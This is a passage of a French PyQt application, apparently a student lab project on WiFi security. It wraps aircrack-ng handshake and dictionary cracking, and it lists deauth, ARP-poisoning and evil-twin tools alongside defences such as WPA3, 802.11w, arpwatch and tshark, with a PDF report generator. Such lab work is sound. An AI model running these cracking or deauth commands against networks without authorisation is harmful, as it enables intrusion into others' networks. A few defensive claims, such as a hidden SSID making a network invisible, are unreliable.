            t.finished.connect(lambda ok, m, term=terminals[i], idx=i:
                term.append(
                    f"<span style='color:{COLORS['success'] if ok else COLORS['danger']};'>"
                    f"{'✅ Terminé' if ok else '❌ Arrêté'}</span>"
                )
            )
            t.start()
            self._wpa_threads.append(t)

        # Mettre à jour le champ dictionnaire
        self.di_capfile.setText(cap_01)
        self.cap_file = cap_01

    def stop_wpa(self):
        """Arrête proprement les 3 processus WPA."""
        for t in getattr(self, '_wpa_threads', []):
            try:
                t.stop()
            except Exception:
                pass
        self._wpa_threads = []
        if hasattr(self, 'w_status'):
            self.w_status.setText("⏹ Processus arrêtés")

    def _on_handshake_output(self, line):
        import re as _re
        m = _re.search(r'__CAPFILE__(.+?)__CAPFILE__', line)
        if m:
            cap_path = m.group(1).strip()
            if cap_path:
                self.cap_file = cap_path
                self.di_capfile.setText(cap_path)
                self.w_t1.append(
                    f"<span style='color:{COLORS['success']};'>"
                    f"✅ Handshake capturé : {cap_path}<br>"
                    f"→ Champ Dictionnaire mis à jour.</span>"
                )
        else:
            self.w_t1.append(line)

    def launch_crack(self):
        cap   = getattr(self, 'cap_file', DEFAULT_CAP)
        wl    = self.w_wordlist.text().strip()
        bssid = self.w_bssid.text().strip()
        cmd   = f"sudo aircrack-ng -b {bssid} -w {wl} {cap}"
        self._run_on_current(cmd)

    def launch_dict(self):
        import glob as _glob

        cap   = self.di_capfile.text().strip()
        wl    = self.di_wordlist.text().strip()
        bssid = self.di_bssid.text().strip()
        ssid  = self.di_ssid.text().strip()

        # Si le fichier n'existe pas → chercher le plus récent automatiquement
        if not cap or not os.path.exists(cap):
            caps = sorted(
                _glob.glob(os.path.join(APP_DIR, "handshake_*-01.cap")),
                reverse=True
            )
            if caps:
                cap = caps[0]
                self.di_capfile.setText(cap)
                self.di_terminal.append(
                    f"<span style='color:{COLORS['warning']};'>"
                    f"ℹ Fichier auto-détecté : {cap}</span><br>"
                )
            else:
                self.di_terminal.clear()
                self.di_terminal.append(
                    f"<span style='color:{COLORS['danger']};'>"
                    f"❌ Aucun fichier .cap trouvé dans {APP_DIR}<br>"
                    f"→ Cliquez 📡 <b>Capturer maintenant</b> pour en créer un.</span>"
                )
                return

        # Construire la commande aircrack-ng — sans -e pour éviter "No matching network"
        cmd = f"sudo aircrack-ng -w {wl}"
        if bssid and bssid != "XX:XX:XX:XX:XX:XX":
            cmd += f" -b {bssid}"
        # Ne pas ajouter -e : le filtre SSID peut bloquer si nom ne correspond pas exactement
        cmd += f" {cap}"

        self.di_terminal.clear()
        self.di_terminal.append(
            f"<span style='color:{COLORS['warning']};'>"
            f"⚔ Attaque dictionnaire lancée...<br>"
            f"Wordlist : {wl}<br>"
            f"Fichier  : {cap}</span><br>"
        )
        self._run_on_current(cmd)


# ==================== ONGLET DÉFENSES ====================
class TabDefenses(QWidget):
    def __init__(self):
        super().__init__()
        self.thread = None
        self._build()

    def _build(self):
        lay = QVBoxLayout(self)
        lay.setContentsMargins(10, 10, 10, 10)

        hdr = QLabel("CONTRE-MESURES ET DÉFENSES WIFI")
        hdr.setStyleSheet(f"font-size:16px; font-weight:bold; color:{COLORS['success']};")
        lay.addWidget(hdr)

        desc = QLabel(
            "Créer un point d'accès sécurisé avec WPA2 ou WPA3 + 802.11w\n"
            "802.11w (MFP = Management Frame Protection) bloque les attaques Deauth.\n"
            "WPA3 utilise SAE (Simultaneous Auth of Equals) — résistant au crack offline."
        )
        desc.setStyleSheet("color:#888; font-size:11px;")
        desc.setWordWrap(True)
        lay.addWidget(desc)

        self.stack = QStackedWidget()

        # ── Page 0 : AP WPA2/WPA3 ──
        ap_w = QWidget()
        ap_lay = QVBoxLayout(ap_w)
        ap_cfg = QGroupBox("Configuration AP sécurisé")
        ap_form = QFormLayout(ap_cfg)
        self.ap_iface = QLineEdit("wlan0")
        self.ap_ssid  = QLineEdit("Groupe7_Secure")
        self.ap_pass  = QLineEdit("MotDePasseTresLong2026!")
        self.ap_mode  = QComboBox()
        self.ap_mode.addItems(["WPA2 (AES/CCMP)", "WPA3 (SAE)", "WPA2+WPA3 (Transition)"])
        self.ap_mfp   = QCheckBox("Activer 802.11w (MFP) — bloque Deauth")
        self.ap_mfp.setChecked(True)
        self.ap_chan  = QLineEdit("6")
        ap_form.addRow("Interface :", self.ap_iface)
        ap_form.addRow("SSID :", self.ap_ssid)
        ap_form.addRow("Mot de passe :", self.ap_pass)
        ap_form.addRow("Mode sécurité :", self.ap_mode)
        ap_form.addRow("", self.ap_mfp)
        ap_form.addRow("Canal :", self.ap_chan)
        ap_lay.addWidget(ap_cfg)
        self.ap_terminal = QTextEdit(); self.ap_terminal.setReadOnly(True)
        ap_lay.addWidget(self.ap_terminal, stretch=1)
        self.stack.addWidget(ap_w)

        # ── Page 1 : arpwatch ──
        arp_w = QWidget()
        aw_lay = QVBoxLayout(arp_w)
        aw_desc = QLabel(
            "arpwatch — Surveillance des tables ARP\n"
            "Détecte les changements d'adresses MAC/IP anormaux (ARP Poisoning).\n"
            "Génère des alertes en temps réel quand une attaque MiM est détectée."
        )
        aw_desc.setWordWrap(True)
        aw_desc.setStyleSheet("color:#888; font-size:11px;")
        aw_lay.addWidget(aw_desc)
        aw_cfg = QGroupBox("Configuration arpwatch")
        aw_form = QFormLayout(aw_cfg)
        self.aw_iface = QLineEdit("wlan0")
        aw_form.addRow("Interface à surveiller :", self.aw_iface)
        aw_lay.addWidget(aw_cfg)
        self.aw_terminal = QTextEdit(); self.aw_terminal.setReadOnly(True)
        aw_lay.addWidget(self.aw_terminal, stretch=1)
        self.stack.addWidget(arp_w)

        # ── Page 2 : tshark ──
        ws_w = QWidget()
        ws_lay = QVBoxLayout(ws_w)
        ws_desc = QLabel(
            "Wireshark / tshark — Analyse du trafic réseau\n"
            "Capture et analyse les paquets pour observer le trafic avant/après chiffrement.\n"
            "But : visualiser les données interceptées et l'effet du chiffrement WPA2/WPA3."
        )
        ws_desc.setWordWrap(True)
        ws_desc.setStyleSheet("color:#888; font-size:11px;")
        ws_lay.addWidget(ws_desc)
        ws_cfg = QGroupBox("Capture tshark")
        ws_form = QFormLayout(ws_cfg)
        self.ws_iface  = QLineEdit("wlan0")
        self.ws_filter = QLineEdit("not arp and not icmp")
        self.ws_count  = QSpinBox()
        self.ws_count.setRange(10, 500); self.ws_count.setValue(50)
        ws_form.addRow("Interface :", self.ws_iface)
        ws_form.addRow("Filtre BPF :", self.ws_filter)
        ws_form.addRow("Nb paquets :", self.ws_count)
        ws_lay.addWidget(ws_cfg)
        self.ws_terminal = QTextEdit(); self.ws_terminal.setReadOnly(True)
        ws_lay.addWidget(self.ws_terminal, stretch=1)
        self.stack.addWidget(ws_w)

        lay.addWidget(self.stack, stretch=1)

    def show_page(self, idx):
        self.stack.setCurrentIndex(idx)

    def _run_on_current(self, cmd):
        idx = self.stack.currentIndex()
        terms = [self.ap_terminal, self.aw_terminal, self.ws_terminal]
        terminal = terms[idx]
        terminal.clear()
        self.thread = CmdThread(cmd)
        self.thread.output.connect(terminal.append)
        self.thread.start()

    def stop_defense(self):
        if self.thread: self.thread.stop()

    def lancer(self):
        idx = self.stack.currentIndex()
        if idx == 0:   self.gen_and_start_ap()
        elif idx == 1: self.start_arpwatch()
        elif idx == 2: self.start_tshark()

    def gen_hostapd(self):
        mode = self.ap_mode.currentIndex()
        mfp  = "2" if self.ap_mfp.isChecked() else "0"
        if mode == 0:
            sec = f"wpa=2\nwpa_passphrase={self.ap_pass.text()}\nwpa_key_mgmt=WPA-PSK\nrsn_pairwise=CCMP"
        elif mode == 1:
            sec = f"wpa=2\nwpa_passphrase={self.ap_pass.text()}\nwpa_key_mgmt=SAE\nrsn_pairwise=CCMP\nsae_require_mfp=1"
        else:
            sec = f"wpa=2\nwpa_passphrase={self.ap_pass.text()}\nwpa_key_mgmt=WPA-PSK SAE\nrsn_pairwise=CCMP"
        conf = (f"interface={self.ap_iface.text()}\ndriver=nl80211\nhw_mode=g\n"
                f"channel={self.ap_chan.text()}\nssid={self.ap_ssid.text()}\n"
                f"wmm_enabled=1\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0\n"
                f"{sec}\nieee80211w={mfp}\n")
        conf_path = "/tmp/hostapd_secure.conf"
        with open(conf_path, "w") as f: f.write(conf)
        self.ap_terminal.append(
            f"<span style='color:{COLORS['success']};'>hostapd.conf → {conf_path}</span><br>"
            f"<pre style='color:{COLORS['text']}; font-size:11px;'>{conf}</pre>"
        )
        return conf_path

    def gen_and_start_ap(self):
        try:
            conf = self.gen_hostapd()
        except Exception as e:
            self.ap_terminal.append(f"<span style='color:{COLORS['danger']};'>Erreur : {e}</span>")
            return
        self._run_on_current(f"sudo hostapd {conf}")

    def start_arpwatch(self):
        iface = self.aw_iface.text().strip()
        self.aw_terminal.append(
            f"<span style='color:{COLORS['success']};'>Surveillance ARP sur {iface}...</span><br>"
        )
        self._run_on_current(f"sudo arpwatch -i {iface} -l /tmp/arpwatch.log")

    def start_tshark(self):
        iface = self.ws_iface.text().strip()
        filt  = self.ws_filter.text().strip()
        count = self.ws_count.value()
        cap   = f"/tmp/capture_{datetime.now():%H%M%S}.pcap"
        cmd   = f"sudo tshark -i {iface} -c {count} -w {cap}"
        if filt: cmd += f" -f '{filt}'"
        self.ws_terminal.append(
            f"<span style='color:{COLORS['success']};'>Capture → {cap}</span><br>"
        )
        self._run_on_current(cmd)


# ==================== ONGLET BILAN ====================
class TabBilan(QWidget):
    def __init__(self):
        super().__init__()
        self.results = []
        self._build()

    def _build(self):
        lay = QVBoxLayout(self)
        lay.setContentsMargins(10, 10, 10, 10)

        hdr = QLabel("BILAN – ATTAQUES VS CONTRE-MESURES")
        hdr.setStyleSheet(f"font-size:16px; font-weight:bold; color:{COLORS['accent']};")
        lay.addWidget(hdr)

        desc = QLabel(
            "Tableau comparatif des attaques démontées et des défenses appliquées.\n"
            "Ce bilan sera inclus dans le rapport PDF final."
        )
        desc.setStyleSheet("color:#888; font-size:11px;")
        desc.setWordWrap(True)
        lay.addWidget(desc)

        # Tableau bilan
        self.table = QTableWidget(6, 5)
        self.table.setHorizontalHeaderLabels([
            "Attaque", "Outil attaque", "Résultat", "Contre-mesure", "Outil défense"
        ])
        self.table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        self.table.setWordWrap(True)
        self.table.verticalHeader().setVisible(False)
        self.table.setEditTriggers(QTableWidget.NoEditTriggers)

        bilan = [
            ("Réseau ouvert / WEP", "airodump-ng\naircrack-ng",
             "Clé cassée en < 2 min", "Migrer vers WPA2/WPA3", "hostapd + WPA3"),
            ("Attaque Deauth\n(déconnexion forcée)", "aireplay-ng --deauth",
             "Clients déconnectés", "Activer 802.11w (MFP)", "hostapd ieee80211w=2"),
            ("WPA Handshake + Crack", "airodump-ng\naircrack-ng",
             "Mot de passe faible cassé", "Mot de passe 20+ chars", "Wordlist non pertinente"),
            ("ARP Poisoning (MiM)", "arpspoof\nettercap",
             "Trafic intercepté", "arpwatch + détection", "arpwatch -i wlan0"),
            ("Rogue AP / Evil Twin", "hostapd-wpe",
             "Clients trompés", "Certificat 802.1X + WIPS", "FreeRADIUS + WPA-Enterprise"),
            ("War Driving\n(cartographie)", "airodump-ng\nKismet",
             "Réseaux détectés", "SSID masqué + WPA3", "hostapd ignore_broadcast"),
        ]

        colors_result = [COLORS['danger'], COLORS['danger'], COLORS['danger'],
                         COLORS['danger'], COLORS['warning'], COLORS['warning']]
        colors_defense = [COLORS['success']] * 6

        for i, (att, tool_a, result, defense, tool_d) in enumerate(bilan):
            self.table.setItem(i, 0, QTableWidgetItem(att))
            self.table.setItem(i, 1, QTableWidgetItem(tool_a))

            ri = QTableWidgetItem(result)
            ri.setBackground(QColor(colors_result[i]))
            ri.setForeground(QBrush(QColor("white")))
            self.table.setItem(i, 2, ri)

            di = QTableWidgetItem(defense)
            di.setBackground(QColor(colors_defense[i]))
            di.setForeground(QBrush(QColor("white")))
            self.table.setItem(i, 3, di)

            self.table.setItem(i, 4, QTableWidgetItem(tool_d))

        self.table.resizeRowsToContents()
        lay.addWidget(self.table)

        self.pdf_status = QLabel("")
        self.pdf_status.setAlignment(Qt.AlignCenter)
        self.pdf_status.setStyleSheet(f"color:{COLORS['success']}; font-weight:bold;")
        lay.addWidget(self.pdf_status)

    def gen_pdf(self):
        self.pdf_status.setText("Génération du PDF en cours...")
        try:
            path = generate_pdf_wifi()
            self.pdf_status.setText(f"✅ PDF généré : {path}")
            subprocess.Popen(["xdg-open", path])
        except Exception as e:
            self.pdf_status.setText(f"Erreur PDF : {e}")


# ==================== GÉNÉRATION PDF ====================
def generate_pdf_wifi():
    from reportlab.lib.pagesizes import A4
    from reportlab.lib import colors as C
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib.units import cm
    from reportlab.platypus import (SimpleDocTemplate, Paragraph, Spacer,
                                    Table, TableStyle, HRFlowable, PageBreak)
    from reportlab.lib.enums import TA_LEFT, TA_CENTER

    pdf_dir = os.path.expanduser("~/CyberSec_Rapports")
    os.makedirs(pdf_dir, exist_ok=True)
    path = os.path.join(pdf_dir, f"wifi_securite_{datetime.now():%Y%m%d_%H%M%S}.pdf")

    doc = SimpleDocTemplate(path, pagesize=A4,
                            leftMargin=1.8*cm, rightMargin=1.8*cm,
                            topMargin=2*cm, bottomMargin=2*cm)
    st   = getSampleStyleSheet()
    PW   = A4[0] - 3.6*cm

    def S(name, **kw): return ParagraphStyle(name, parent=st['Normal'], **kw)

    small  = S('sm',  fontSize=8,  leading=11)
    normal = S('nm',  fontSize=9,  leading=13)
    h1     = S('h1p', fontSize=13, leading=16, fontName='Helvetica-Bold',
               textColor=C.HexColor("#1a56db"), spaceBefore=14, spaceAfter=6)
    h2_org = S('h2o', fontSize=11, leading=14, fontName='Helvetica-Bold',
               textColor=C.HexColor("#c05621"), spaceBefore=10, spaceAfter=5)
    title  = S('tit', fontSize=18, leading=22, fontName='Helvetica-Bold',
               textColor=C.HexColor("#1e3a5f"))
    hdr    = S('hdr', fontSize=8,  leading=10, fontName='Helvetica-Bold',
               textColor=C.white, alignment=TA_CENTER)
    green  = S('grn', fontSize=8,  leading=10, fontName='Helvetica-Bold',
               textColor=C.white, alignment=TA_CENTER,
               backColor=C.HexColor("#166534"))
    red    = S('red', fontSize=8,  leading=10, fontName='Helvetica-Bold',
               textColor=C.white, alignment=TA_CENTER,
               backColor=C.HexColor("#7f1d1d"))

    def tbl_style(header_col=C.HexColor("#1e3a5f")):
        return TableStyle([
            ('BACKGROUND',     (0,0), (-1,0), header_col),
            ('ROWBACKGROUNDS', (0,1), (-1,-1), [C.white, C.HexColor("#f0f4f8")]),
            ('GRID',           (0,0), (-1,-1), 0.5, C.grey),
            ('PADDING',        (0,0), (-1,-1), 7),
            ('VALIGN',         (0,0), (-1,-1), 'TOP'),
        ])

    story = []

    # ── Page de garde ──
    story += [
        Paragraph("RAPPORT – SECURITE RESEAU WIFI", title),
        Paragraph("Groupe 7 | Sujet 3 – Menaces et contre-mesures WiFi | CyberSec 2026", small),
        HRFlowable(width="100%", thickness=2, color=C.HexColor("#1a56db")),
        Spacer(1, 0.4*cm),
    ]

    meta = [
        [Paragraph("Sujet", hdr),    Paragraph("Securite d'un reseau WiFi", small)],
        [Paragraph("Groupe", hdr),   Paragraph("Groupe 7", small)],
        [Paragraph("Outils", hdr),   Paragraph("aircrack-ng, aireplay-ng, hostapd, arpwatch, tshark, Wireshark", small)],
        [Paragraph("Date", hdr),     Paragraph(datetime.now().strftime("%d/%m/%Y a %H:%M"), small)],
        [Paragraph("Objectif", hdr), Paragraph("Demonstrer les attaques WiFi et valider les contre-mesures", small)],
    ]
    mt = Table(meta, colWidths=[3*cm, PW-3*cm])
    mt.setStyle(TableStyle([
        ('BACKGROUND',    (0,0), (0,-1), C.HexColor("#1e3a5f")),
        ('TEXTCOLOR',     (0,0), (0,-1), C.white),
        ('ROWBACKGROUNDS',(1,0), (1,-1), [C.white, C.HexColor("#f0f4f8")]),
        ('GRID',          (0,0), (-1,-1), 0.5, C.grey),
        ('VALIGN',        (0,0), (-1,-1), 'TOP'),
        ('PADDING',       (0,0), (-1,-1), 6),
    ]))
    story += [mt, Spacer(1, 0.5*cm)]

    # ── Section 1 : Architecture ──
    story.append(Paragraph("1. ARCHITECTURE DE LA DEMONSTRATION", h1))
    arch_data = [
        [Paragraph("Composant", hdr), Paragraph("Role", hdr), Paragraph("Outil", hdr)],
        [Paragraph("PC Kali Linux", small), Paragraph("Attaquant + Defenseur", small), Paragraph("Kali Linux 2024", small)],
        [Paragraph("Interface wlan0mon", small), Paragraph("Ecoute passive (mode moniteur)", small), Paragraph("airmon-ng", small)],
        [Paragraph("AP WiFi test", small), Paragraph("Cible des attaques", small), Paragraph("hostapd", small)],
        [Paragraph("Client WiFi (telephone)", small), Paragraph("Victime des attaques", small), Paragraph("Appareil mobile", small)],
        [Paragraph("USB tethering", small), Paragraph("Connexion internet Kali", small), Paragraph("usb0", small)],
    ]
    t = Table(arch_data, colWidths=[PW*0.3, PW*0.4, PW*0.3])
    t.setStyle(tbl_style())
    story += [t, Spacer(1, 0.4*cm)]

    # ── Section 2 : Attaques ──
    story.append(Paragraph("2. ATTAQUES DEMONSTREES", h1))

    attaques = [
        ("Reseau ouvert / WEP", "Chiffrement absent ou casse en < 2 minutes",
         "airodump-ng + aircrack-ng", "CRITIQUE"),
        ("Deauth (802.11)", "Deconnexion forcee de tous les clients du reseau",
         "aireplay-ng --deauth", "ELEVE"),
        ("WPA Handshake Crack", "Capture du 4-way handshake puis crack offline avec dictionnaire",
         "airodump-ng + aircrack-ng + rockyou.txt", "ELEVE"),
        ("ARP Poisoning (MiM)", "Interception de tout le trafic entre client et routeur",
         "arpspoof", "ELEVE"),
        ("War Driving", "Cartographie des reseaux WiFi accessibles dans la zone",
         "airodump-ng + Kismet", "MOYEN"),
    ]

    att_data = [[Paragraph("Attaque", hdr), Paragraph("Description", hdr),
                 Paragraph("Outil", hdr), Paragraph("Niveau", hdr)]]
    risk_colors = {
        "CRITIQUE": C.HexColor("#7f1d1d"),
        "ELEVE":    C.HexColor("#c0392b"),
        "MOYEN":    C.HexColor("#d97706"),
    }
    att_style_cmds = list(tbl_style().getCommands())

    for i, (att, desc, tool, niveau) in enumerate(attaques, 1):
        rc = risk_colors.get(niveau, C.grey)
        ns = S(f'ns{i}', fontSize=8, leading=10, fontName='Helvetica-Bold',
               textColor=C.white, alignment=TA_CENTER)
        att_data.append([Paragraph(att, small), Paragraph(desc, small),
                         Paragraph(tool, small), Paragraph(niveau, ns)])
        att_style_cmds.append(('BACKGROUND', (3, i), (3, i), rc))

    att_tbl = Table(att_data, colWidths=[PW*0.22, PW*0.38, PW*0.25, PW*0.15])
    att_tbl.setStyle(TableStyle(att_style_cmds))
    story += [att_tbl, Spacer(1, 0.4*cm)]

    # ── Section 3 : Contre-mesures ──
    story.append(Paragraph("3. CONTRE-MESURES APPLIQUEES", h1))

    defenses = [
        ("Reseau ouvert / WEP", "Migration vers WPA3 (SAE)",
         "hostapd avec wpa_key_mgmt=SAE", "Crack impossible sans cle PSK forte"),
        ("Deauth attack", "Activation 802.11w (MFP)",
         "hostapd avec ieee80211w=2", "Trames deauth ignorees par le client"),
        ("WPA Crack", "Mot de passe 20+ caracteres complexes",
         "Politique de mot de passe forte", "Dictionnaire inefficace (temps > 1000 ans)"),
        ("ARP Poisoning", "Surveillance arpwatch + ARP statique",
         "arpwatch -i wlan0", "Alerte immediate sur changement MAC/IP"),
        ("War Driving", "SSID masque + filtrage MAC",
         "ignore_broadcast_ssid=1 dans hostapd", "Reseau invisible aux scanners passifs"),
    ]

    def_data = [[Paragraph("Attaque ciblee", hdr), Paragraph("Contre-mesure", hdr),
                 Paragraph("Outil / Configuration", hdr), Paragraph("Effet", hdr)]]
    for att, cm_txt, tool, effet in defenses:
        def_data.append([Paragraph(att, small), Paragraph(cm_txt, small),
                         Paragraph(tool, small), Paragraph(effet, small)])

    def_tbl = Table(def_data, colWidths=[PW*0.2, PW*0.25, PW*0.3, PW*0.25])
    def_tbl.setStyle(tbl_style(C.HexColor("#166534")))
    story += [def_tbl, Spacer(1, 0.4*cm)]

    story.append(PageBreak())

    # ── Section 4 : Protocoles de sécurité ──
    story.append(Paragraph("4. COMPARAISON DES PROTOCOLES WIFI", h1))

    proto_data = [
        [Paragraph(t, hdr) for t in ["Protocole", "Annee", "Chiffrement", "Niveau securite", "Vulnerabilites"]],
        [Paragraph("WEP",  small), Paragraph("1997", small), Paragraph("RC4 (40/128 bits)", small),
         Paragraph("Tres faible", red), Paragraph("Casse en < 2 min (FMS, KoreK)", small)],
        [Paragraph("WPA",  small), Paragraph("2003", small), Paragraph("TKIP/RC4", small),
         Paragraph("Faible",      S('fw', fontSize=8, leading=10, fontName='Helvetica-Bold',
                                    textColor=C.white, alignment=TA_CENTER,
                                    backColor=C.HexColor("#d97706"))),
         Paragraph("TKIP vulnerable, attaques dict.", small)],
        [Paragraph("WPA2", small), Paragraph("2004", small), Paragraph("AES-CCMP (128 bits)", small),
         Paragraph("Modere",      S('md', fontSize=8, leading=10, fontName='Helvetica-Bold',
                                    textColor=C.white, alignment=TA_CENTER,
                                    backColor=C.HexColor("#d97706"))),
         Paragraph("KRACK, crack si MDP faible", small)],
        [Paragraph("WPA3", small), Paragraph("2018", small), Paragraph("AES-CCMP/GCMP (256 bits)", small),
         Paragraph("Eleve", green), Paragraph("Deploiement complexe, peu d'appareils", small)],
    ]
    proto_tbl = Table(proto_data, colWidths=[PW*0.12, PW*0.1, PW*0.22, PW*0.15, PW*0.41])
    proto_tbl.setStyle(tbl_style())
    story += [proto_tbl, Spacer(1, 0.4*cm)]

    # ── Section 5 : Bilan ──
    story.append(Paragraph("5. BILAN ET CONCLUSION", h1))
    conclusion = [
        Paragraph("La demonstration a montre que les reseaux WiFi non securises sont extremement vulnerables.", normal),
        Spacer(1, 0.2*cm),
        Paragraph("Points cles :", S('pk', fontSize=9, leading=13, fontName='Helvetica-Bold')),
        Paragraph("• WEP est obsolete et ne doit plus jamais etre utilise.", normal),
        Paragraph("• WPA2 est acceptable avec un mot de passe long et complexe (20+ caracteres).", normal),
        Paragraph("• WPA3 avec 802.11w est la solution recommandee pour 2024.", normal),
        Paragraph("• Les attaques Deauth sont bloquees par ieee80211w=2 (MFP obligatoire).", normal),
        Paragraph("• arpwatch detecte efficacement les attaques ARP Poisoning en temps reel.", normal),
        Paragraph("• La sensibilisation des utilisateurs reste la premiere ligne de defense.", normal),
    ]
    story.extend(conclusion)

    doc.build(story)
    return path


# ==================== FENÊTRE PRINCIPALE ====================
class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Securite Reseau WiFi – Groupe 7 (Sujet 3)")
        self.resize(1280, 860)
        self.setMinimumSize(1000, 650)
        self._build()

    def _build(self):
        self.setStyleSheet(stylesheet())
        central = QWidget()
        self.setCentralWidget(central)
        lay = QVBoxLayout(central)
        lay.setContentsMargins(14, 14, 14, 0)
        lay.setSpacing(6)

        # ── Titre ──
        title_row = QHBoxLayout()
        title = QLabel("SECURITE RESEAU WIFI – ATTAQUES & CONTRE-MESURES")
        title.setStyleSheet(f"font-size:20px; font-weight:bold; color:{COLORS['accent']};")
        title_row.addWidget(title, stretch=1)
        btn_help = QPushButton("i")
        btn_help.setFixedSize(34, 34)
        btn_help.setStyleSheet(f"""
            QPushButton {{
                background:#1e3a5f; color:{COLORS['accent']};
                border:2px solid {COLORS['accent']}; border-radius:17px;
                font-size:14px; font-weight:bold;
            }}
            QPushButton:hover {{ background:{COLORS['accent']}; color:white; }}
        """)
        btn_help.clicked.connect(self.open_help)
        title_row.addWidget(btn_help)
        lay.addLayout(title_row)

        sub = QLabel("Groupe 7 | Sujet 3 – Sécurité d'un réseau WiFi | Outils : aircrack-ng, hostapd, arpwatch, tshark")
        sub.setStyleSheet("color:#888; font-size:11px;")
        lay.addWidget(sub)

        # ── QStackedWidget — pages principales ──
        self.stack = QStackedWidget()

        self.tab_scanner  = TabScanner()
        self.tab_attaques = TabAttaques()
        self.tab_defenses = TabDefenses()
        self.tab_bilan    = TabBilan()

        self.stack.addWidget(self.tab_scanner)   # 0
        self.stack.addWidget(self.tab_attaques)  # 1
        self.stack.addWidget(self.tab_defenses)  # 2
        self.stack.addWidget(self.tab_bilan)     # 3

        lay.addWidget(self.stack, stretch=1)

        # ── Connecter signal scanner → attaques ──
        self.tab_scanner.networks_updated.connect(self.tab_attaques.update_networks)

        # ── Barre de boutons EN BAS ──
        bottom = QFrame()
        bottom.setFixedHeight(54)
        bottom.setStyleSheet(
            f"background:{COLORS['input']}; border-top:1px solid {COLORS['border']};"
        )
        bot_lay = QHBoxLayout(bottom)
        bot_lay.setContentsMargins(14, 6, 14, 6)
        bot_lay.setSpacing(8)

        # ── GAUCHE : Dropdown navigation principal (4 pages) ──
        self.nav_combo = QComboBox()
        self.nav_combo.addItems([
            "Scanner WiFi",
            "Attaques",
            "Défenses",
            "Bilan & PDF",
        ])
        self.nav_combo.setFixedWidth(160)
        self.nav_combo.currentIndexChanged.connect(self._on_nav)
        bot_lay.addWidget(self.nav_combo)

        self.btn_lancer = QPushButton("Scanner")
        self.btn_lancer.setFixedHeight(36)
        self.btn_lancer.setStyleSheet("background:#166534; font-weight:bold; min-width:80px;")
        self.btn_lancer.clicked.connect(self._lancer)
        bot_lay.addWidget(self.btn_lancer)

        self.btn_arreter = QPushButton("Arrêter")
        self.btn_arreter.setFixedHeight(36)
        self.btn_arreter.setStyleSheet("background:#7f1d1d; font-weight:bold; min-width:80px;")
        self.btn_arreter.clicked.connect(self._arreter)
        bot_lay.addWidget(self.btn_arreter)

        # ── MILIEU : stretch ──
        bot_lay.addStretch()

        # ── DROITE : Boutons contextuels Scanner ──
        self.btn_nmcli    = self._bot_btn("Scanner (nmcli)", "#166534")
        self.btn_monitor  = self._bot_btn("Mode moniteur",   "#c05621")
        self.btn_airodump = self._bot_btn("Airodump-ng",     COLORS['accent'])
        self.btn_restore  = self._bot_btn("Restaurer réseau","#1e3a5f")
        self.btn_nmcli.clicked.connect(self.tab_scanner.scan_nmcli)
        self.btn_monitor.clicked.connect(self.tab_scanner.enable_monitor)
        self.btn_airodump.clicked.connect(self.tab_scanner.scan_airodump)
        self.btn_restore.clicked.connect(self.tab_scanner.restore_nm)
        self._scanner_btns = [self.btn_nmcli, self.btn_monitor,
                               self.btn_airodump, self.btn_restore]
        for b in self._scanner_btns:
            bot_lay.addWidget(b)

        # ── DROITE : Dropdown sous-page Attaques ──
        self.att_sub_combo = QComboBox()
        self.att_sub_combo.addItems([
            "Deauth (802.11)",
            "ARP Poisoning (MiM)",
            "WPA Handshake + Crack",
            "Attaque Dictionnaire",
        ])
        self.att_sub_combo.setFixedWidth(210)
        self.att_sub_combo.setStyleSheet(f"""
            QComboBox {{
                background: {COLORS['danger']};
                color: white;
                border: 1px solid {COLORS['danger']};
                border-radius: 4px;
                padding: 4px 10px 4px 10px;
                font-size: 11px;
                font-weight: bold;
            }}
            QComboBox::drop-down {{
                subcontrol-origin: padding;
                subcontrol-position: right center;
                width: 24px;
                border-left: 1px solid rgba(255,255,255,0.3);
                background: rgba(0,0,0,0.2);
                border-radius: 0 4px 4px 0;
            }}
            QComboBox::down-arrow {{
                image: none;
                width: 0; height: 0;
                border-left: 5px solid transparent;
                border-right: 5px solid transparent;
                border-top: 6px solid white;
            }}
            QComboBox QAbstractItemView {{
                background: {COLORS['input']};
                color: {COLORS['text']};
                border: 1px solid {COLORS['border']};
                selection-background-color: {COLORS['danger']};
            }}
        """)
        self.att_sub_combo.currentIndexChanged.connect(self._att_page)
        bot_lay.addWidget(self.att_sub_combo)

        # ── DROITE : Dropdown sous-page Défenses ──
        self.def_sub_combo = QComboBox()
        self.def_sub_combo.addItems([
            "AP WPA2/WPA3 + 802.11w",
            "arpwatch (Anti-MiM)",
            "Analyse trafic (tshark)",
        ])
        self.def_sub_combo.setFixedWidth(220)
        self.def_sub_combo.setStyleSheet(f"""
            QComboBox {{
                background: {COLORS['success']};
                color: white;
                border: 1px solid {COLORS['success']};
                border-radius: 4px;
                padding: 4px 10px 4px 10px;
                font-size: 11px;
                font-weight: bold;
            }}
            QComboBox::drop-down {{
                subcontrol-origin: padding;
                subcontrol-position: right center;
                width: 24px;
                border-left: 1px solid rgba(255,255,255,0.3);
                background: rgba(0,0,0,0.2);
                border-radius: 0 4px 4px 0;
            }}
            QComboBox::down-arrow {{
                image: none;
                width: 0; height: 0;
                border-left: 5px solid transparent;
                border-right: 5px solid transparent;
                border-top: 6px solid white;
            }}
            QComboBox QAbstractItemView {{
                background: {COLORS['input']};
                color: {COLORS['text']};
                border: 1px solid {COLORS['border']};
                selection-background-color: {COLORS['success']};
            }}
        """)
        self.def_sub_combo.currentIndexChanged.connect(self._def_page)
        bot_lay.addWidget(self.def_sub_combo)

        # ── DROITE : Bouton Generer hostapd.conf (Défenses seulement) ──
        self.btn_gen_conf = self._bot_btn("hostapd.conf", "#1e3a5f")
        self.btn_gen_conf.clicked.connect(lambda: self.tab_defenses.gen_hostapd())
        bot_lay.addWidget(self.btn_gen_conf)

        # ── DROITE : Bouton PDF (Bilan seulement) ──
        self.btn_pdf = self._bot_btn("Générer PDF", COLORS['accent'])
        self.btn_pdf.clicked.connect(self.tab_bilan.gen_pdf)
        bot_lay.addWidget(self.btn_pdf)

        lay.addWidget(bottom)

        # Listes pour visibilité contextuelle
        self._scanner_btns_all = self._scanner_btns
        self._update_bottom_btns(0)

    def _bot_btn(self, label, color, checkable=False):
        b = QPushButton(label)
        b.setFixedHeight(34)
        b.setCheckable(checkable)
        b.setStyleSheet(f"""
            QPushButton {{
                background: transparent;
